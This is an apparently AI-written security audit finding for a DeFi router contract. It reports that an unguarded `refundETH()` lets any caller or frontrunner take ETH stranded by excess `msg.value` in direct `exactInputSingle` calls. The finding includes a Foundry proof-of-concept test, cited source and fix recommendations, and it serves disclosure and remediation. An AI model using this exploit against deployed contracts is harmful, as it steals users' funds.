The vulnerability is real. Here is the complete analysis:

---

### Title
Unguarded `refundETH()` allows any caller to steal ETH stranded by excess `msg.value` in a non-multicall `exactInputSingle(tokenIn=WETH)` - (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary

`refundETH()` sends the entire native ETH balance of the router to `msg.sender` with no access control. When a user calls `exactInputSingle` directly (not via `multicall`) with `tokenIn=WETH` and `msg.value > amountIn`, the `pay()` function wraps only `amountIn` ETH and leaves the remainder stranded on the router. Any attacker can then call `refundETH()` in a subsequent transaction to drain that ETH.

### Finding Description

`refundETH()` is unconditional: [1](#0-0) 

When `exactInputSingle` is called with `tokenIn=WETH` and `msg.value > amountIn`, the `pay()` function enters the `nativeBalance >= value` branch and wraps only `amountIn` ETH into WETH, leaving `msg.value - amountIn` ETH on the router: [2](#0-1) 

`exactInputSingle` itself performs no refund after the swap completes: [3](#0-2) 

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only applies to plain ETH transfers with no calldata. ETH sent as `msg.value` on a function call bypasses `receive()` entirely and is credited to the contract balance. [4](#0-3) 

The intended safe pattern is to bundle `exactInputSingle` + `refundETH()` inside `multicall`, as shown in the test suite: [5](#0-4) 

But nothing in the contract enforces this pattern. A user calling `exactInputSingle` directly with excess ETH creates a window (until the next block or even within the same block by a frontrunner) for any attacker to call `refundETH()` and receive the stranded ETH.

### Impact Explanation

Direct loss of user ETH principal. The attacker receives `msg.value - amountIn` ETH that belongs to the original caller. No privileged role is required; the attack path is fully permissionless.

### Likelihood Explanation

Users routinely send excess ETH to avoid reverts from price movement (the same reason Uniswap v3 popularized the multicall+refundETH pattern). The function is `payable` and accepts ETH, so the behavior is not obviously wrong to an integrator or end user. A frontrunning bot monitoring the mempool can atomically steal the ETH in the same block.

### Recommendation

Either:
1. At the end of `exactInputSingle` (and `exactInput`, `exactOutputSingle`, `exactOutput`), automatically refund any remaining `address(this).balance` to `msg.sender`, or
2. Remove `payable` from the single-call entry points and require users to use `multicall` for ETH input paths, enforcing the safe pattern at the ABI level.

### Proof of Concept

```solidity
// Foundry test sketch
function test_attacker_steals_excess_eth() public {
    address user    = makeAddr("user");
    address attacker = makeAddr("attacker");
    vm.deal(user, 2 ether);

    // User calls exactInputSingle directly (not via multicall)
    // with msg.value=2e18 but amountIn=1e18
    vm.prank(user);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,          // only 1 ETH used
            amountOutMinimum: 0,
            recipient: user,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // 1 ETH is now stranded on the router
    assertEq(address(router).balance, 1 ether);

    // Attacker steals it
    uint256 before = attacker.balance;
    vm.prank(attacker);
    router.refundETH();
    assertEq(attacker.balance - before, 1 ether); // attacker gained user's ETH

    // User cannot recover their ETH
    vm.prank(user);
    router.refundETH();
    assertEq(address(router).balance, 0); // nothing left for user
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-78)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
